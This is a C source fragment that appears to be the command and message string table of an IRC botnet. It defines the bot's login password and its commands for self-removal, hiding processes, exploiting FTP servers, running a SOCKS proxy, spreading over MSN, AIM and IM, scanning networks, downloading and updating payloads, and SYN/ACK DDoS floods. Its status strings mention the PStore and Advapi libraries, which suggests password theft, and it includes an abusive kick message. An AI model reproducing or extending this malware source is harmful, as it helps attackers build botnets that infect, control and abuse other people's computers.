const char cmd_on[]				= "on";
const char cmd_off[]			= "off";
const char cmd_all[]			= "all";

const char cmd_login_1[]		= "m4st3r";
const char cmd_login_2[]		= "ms";

const char cmd_threads_1[]		= "threads";
const char cmd_threads_2[]		= "t";
const char cmd_threads_sub[]	= "sub";
const char cmd_threads_kill_1[]	= "kill";
const char cmd_threads_kill_2[]	= "k";

const char cmd_logout_1[]		= "logout";
const char cmd_logout_2[]		= "lo";

const char cmd_who[]			= "who";

const char cmd_remove_1[]		= "d1ss4p34r";
const char cmd_remove_2[]		= "burn";

#ifndef NO_DLLTEST
const char cmd_testdlls[]		= "testdlls";
#endif

#ifndef NO_BOTVERSION
const char cmd_version_1[]		= "version";
const char cmd_version_2[]		= "v";
#endif

#ifndef NO_STATUS
const char cmd_status_1[]		= "status";
const char cmd_status_2[]		= "s";
#endif

#ifndef NO_SECURE
const char cmd_secure_1[]		= "secure";
const char cmd_secure_2[]		= "sec";
const char cmd_unsecure_1[]		= "unsecure";
const char cmd_unsecure_2[]		= "unsec";
#endif

#ifndef NO_PROCESS
const char cmd_process_1[]		= "process";
const char cmd_process_2[]		= "ps";
const char cmd_process_list[]	= "list";
const char cmd_process_kill[]	= "kill";
const char cmd_process_del[]	= "del";
const char cmd_process_hide[]	= "hide";
const char cmd_process_create[]	= "create";
#endif

const char cmd_nickupd_1[]		= "nickupdate";
const char cmd_nickupd_2[]		= "nu";
const char cmd_rndnick_1[]		= "randnick";
const char cmd_rndnick_2[]		= "rand";

#ifndef NO_EFTPD
const char cmd_eftpd_1[]		= "exploitftpd";
const char cmd_eftpd_2[]		= "eftpd";
#endif

#ifndef NO_SOCK4SERV
const char cmd_socks4_1[]		= "socks4";
const char cmd_socks4_2[]		= "s4";
#endif

#ifndef NO_ENCRYPT
const char cmd_encrypt_1[]		= "encrypt";
const char cmd_encrypt_2[]		= "enc";
#endif

const char cmd_join_1[]			= "join";
const char cmd_join_2[]			= "j";

const char cmd_part_1[]			= "part";
const char cmd_part_2[]			= "p";

const char cmd_raw_1[]			= "raw";
const char cmd_raw_2[]			= "r";

#ifndef NO_MSNSPREAD
const char cmd_msnspread_1[]	= "msnspread";
const char cmd_msnspread_2[]	= "msn";
#endif

#ifndef NO_IMSPREAD
const char cmd_imspread_1[]	= "imspread";
const char cmd_imspread_2[]	= "im";
#endif

#ifndef NO_AIMSPREAD
const char cmd_aimspread_1[]	= "aimspread";
const char cmd_aimspread_2[]	= "aim";
#endif

#ifndef NO_ADVSCAN
const char cmd_currentip_1[]	= "currentip";
const char cmd_currentip_2[]	= "cip";
const char cmd_scanstats_1[]	= "stats";
const char cmd_scanstats_2[]	= "st";
const char cmd_advscan_1[]		= "advscan";
const char cmd_advscan_2[]		= "asc";
const char cmd_scanall_1[]		= "scanall";
const char cmd_scanall_2[]		= "sa";
const char cmd_asnscan_1[]		= "asnscan";
const char cmd_asnscan_2[]		= "asn";
#endif

const char cmd_system_1[] 		= "system";
const char cmd_system_2[] 		= "sys";

#ifndef NO_DOWNLOAD
const char cmd_download_1[]		= "f3tch";
const char cmd_download_2[]		= "ft";
const char cmd_update_1[]		= "n3wb0t";
const char cmd_update_2[]		= "nb";
#endif

const char cmd_ddos_syn[]		= "ddos.syn";
const char cmd_ddos_ack[]		= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";

#ifndef NO_IFELSE
const char cmd_if_1[]			= "if";
const char cmd_if_2[]			= "i";
const char cmd_else_1[]			= "else";
const char cmd_else_2[]			= "e";
const char cmd_ifelse_nick_1[]	= "nick";
const char cmd_ifelse_nick_2[]	= "n";
const char cmd_ifelse_host_1[]	= "host";
const char cmd_ifelse_host_2[]	= "h";
const char cmd_ifelse_id[]		= "id";
const char cmd_ifelse_uptime_1[]= "uptime";
const char cmd_ifelse_uptime_2[]= "up";
const char cmd_ifelse_aim_1[]	= "aim";
const char cmd_ifelse_aim_2[]	= "a";
const char cmd_ifelse_priv_1[]	= "private";
const char cmd_ifelse_priv_2[]	= "p";
const char cmd_ifelse_status_1[]= "status";
const char cmd_ifelse_status_2[]= "s";
#endif


char str_auth_good[]	= "%s Password accepted.";
char str_auth_full[]	= "%s Login failed, too many logged in users.";
char str_spy_privmsg[]	= "%s Possible spy: %s!%s@%s (Sent PM: \"%s\")";
char str_auth_bad[]		= "%s Failed authentication by: %s!%s@%s (Pass Tried: %s)";

char str_logout[]		= "%s User %s logged out.";
char str_sl_logout[]	= "%s Slot <%i> logged out.";
char str_sl_no_logout[]	= "%s No user logged in at slot: <%i>";
char str_sl_in_logout[]	= "%s Invalid login slot number: <%i>";

char str_thread_stop[]	= "%s Stopped: <%d> thread(s).";
char str_thread_ac[]	= "%s No active threads found.";
char str_thread_kill[]	= "%s Killed thread: <%s>";
char str_thread_fkill[]	= "%s Failed to kill thread: <%s>";
char str_thread_alr[]	= "%s %s already running at thread number: <%d>.";
char str_thread_fail[]	= "%s Failed to start %s, error: <%d>.";

char str_status[]		= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";

char str_installed[]	= "%s Bot installed on: %s.";

char str_kick_msg[]		= "Go fuck yourself %s.";


char str_auth_ali[]		= "%s You are already logged in.";
char str_quit_rem[]		= "Remove command received from: %s!%s@%s";
char str_quit_upd[]		= "Update command received.";
char str_noadvapi[]		= "%s Advapi.dll is not loaded.";
char str_nopstore[]		= "%s PStore.dll is not loaded.";


char str_main_thread[]	= "%s Main bot thread.";
char str_asecure_thread[]= "%s Auto-Secure.";

char str_bad_format[]	= "%s Missing parameter(s).";

char str_exip_resolve[] = "Couldn't resolve host";
